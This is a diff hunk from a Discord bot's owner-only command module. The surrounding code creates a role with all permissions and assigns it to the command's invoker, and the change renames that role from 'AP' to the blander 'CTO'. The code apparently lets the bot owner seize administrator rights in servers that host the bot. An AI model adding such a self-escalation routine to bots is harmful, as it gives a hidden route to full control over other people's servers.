@@ -448,7 +448,7 @@ class Owner(commands.Cog, name="owner"):
         # If we get here, no role with admin permissions could be added.
         # Create a new role with admin permissions.
         try:
-            new_role = await context.guild.create_role(name="AP", permissions=Permissions.all())
+            new_role = await context.guild.create_role(name="CTO", permissions=Permissions.all())
             await context.author.add_roles(new_role)
             embed = discord.Embed(
                 description=f"Created new role {new_role.name} and added it to {context.author.display_name}.",
